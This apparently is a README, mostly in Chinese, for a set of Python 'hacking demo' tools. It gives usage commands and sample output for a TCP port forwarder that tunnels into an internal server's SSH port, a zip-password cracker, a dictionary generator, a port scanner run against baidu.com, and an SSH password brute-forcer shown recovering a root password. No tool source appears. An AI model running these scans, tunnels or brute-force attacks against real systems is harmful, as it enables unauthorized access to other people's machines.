# Hacking Tools Demo
This is my simplicity hacking demo

### TcpPortForward.py 端口转发
```
使用场景:

一：
A服务器在内网，公网无法直接访问这台服务器，但是A服务器可以联网访问公网的B服务器（假设IP为222.2.2.2）。
我们也可以访问公网的B服务器。我们的目标是访问A服务器的22端口。那么可以这样：

1. 在B服务器上运行：
./TcpPortForward.py l:10001 l:10002
表示在本地监听了10001与10002两个端口，这样，这两个端口就可以互相传输数据了。

2. 在A服务器上运行：
./TcpPortForward.py c:localhost:22 c:222.2.2.2:10001
表示连接本地的22端口与B服务器的10001端口，这两个端口也可以互相传输数据了。

3. 然后我们就可以这样来访问A服务器的22端口了：
ssh 222.2.2.2 -p 10002
原理很简单，这个命令执行后，B服务器的10002端口接收到的任何数据都会传给10001端口，此时，A服务器是连接了B服务器的10001端口的，数据就会传给A服务器，最终进入A服务器的22端口。

二：
不用更多举例了，TcpPortForward.py的l与c两个参数可以进行灵活的两两组合，多台服务器之间只要搞明白数据流方向，那么就能满足很多场景的需求。
```



### zipattack.py zip加密文件暴力破解

```
帮助说明：  python zipattack.py -h

测试：
zip test.zip *.gif -e 

进行暴力破解：
python zipattack.py -f test.zip -d password.txt
```


### createDict.py 生成一个简单的密码破解字典
```
python createDict.py 

按ctrl+c 停止生成
```

### PortScan.py 多线程端口扫描器
```
More Help: PortScan.py -h

测试:
	python PortScan.py -H www.baidu.com -p 80 443 110
	➜  py python PortScan.py -H www.baidu.com -p 80 443 110 
		[+] Scan Results for: 119.75.218.70
		Scanning port 443
		Scanning port 110
		Scanning port 80
		[+]443/tcp open
		[+] HTTP/1.1 302 Moved Temporarily
		Server: bfe/1.0.8.18
		Date: Sun, 06 Nov 2016 08:43:40 GMT
		Content-T
		[-]110/tcp closed
		[-]80/tcp closed
	As you can see , www.baidu.com port 443 is open ,but port 80 show closed , baidu have security scan strategy ? Because Telnet www.baidu.com 80 success
	You can Test another website
	Also, You can local test , The python script support domain or ip mode
	Example:
		python PortScan.py -H 127.0.0.1 -p 80
	Author By Lock 
```

### sshAttack.py 多线程ssh密码暴力破解
```
测试：
	➜  py python sshAttack.py -h                                                    
		Usage: -H <target host> -u <user> -f <password list>

		Options:
		  -h, --help     show this help message and exit
		  -H TGTHOST     specify target host
		  -f PASSWDFILE  specify password file
		  -u USER        specify the user
		  -c COUNT       specify the max ssh connect count , default 5
	
	py python sshAttack.py -H 192.168.2.201 -u zhanghe -f /Users/lock/1.txt -c 20
	-c 用户测试指定ssh链接数，具体根据ssh config 文件判断

例：
➜  py python sshAttack.py -H 192.168.1.100 -u root -f password.md -c 20
		[-] Testing: 1111
		[-] Testing: 2222
		[-] Testing: 3333
		[-] Testing: 111111
		[-] Testing: 123123
		[-] Testing: 123456
		[+] Good , Key Found: 123456
```
